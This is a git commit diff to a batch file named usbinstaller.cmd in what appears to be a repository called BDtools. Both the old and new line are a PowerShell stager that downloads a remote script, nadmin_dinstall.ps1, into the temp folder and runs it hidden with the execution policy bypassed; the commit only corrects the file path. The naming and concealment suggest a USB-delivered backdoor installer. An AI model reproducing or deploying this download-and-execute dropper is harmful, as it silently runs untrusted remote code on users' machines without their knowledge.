b38a35936002da70ded73695571c868604a3abe0
blousekool <132397759+blousekool@users.noreply.github.com>
2024-02-08 12:14:04 +0100

    Update usbinstaller.cmd

--- bd/usbinstaller.cmd
+++ bd/usbinstaller.cmd
@@ -1,3 +1,3 @@
 @echo off
-powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%Temp%\nadmin_dinstall.ps1"' -WindowStyle Hidden
+powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "$env:temp/nadmin_dinstall.ps1"' -WindowStyle Hidden
 exit
